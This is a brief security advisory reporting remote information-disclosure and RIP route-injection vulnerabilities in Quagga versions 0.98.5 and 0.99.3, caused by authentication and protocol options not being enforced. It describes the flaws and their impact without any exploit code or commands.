Quagga is susceptible to remote information-disclosure and route-injection vulnerabilities. The application fails to properly ensure that required authentication and protocol configuration options are enforced.

These issues allow remote attackers to gain access to potentially sensitive network-routing configuration information and to inject arbitrary routes into the RIP routing table. This may aid malicious users in further attacks against targeted networks.

Quagga versions 0.98.5 and 0.99.3 are vulnerable to these issues; other versions may also be affected.
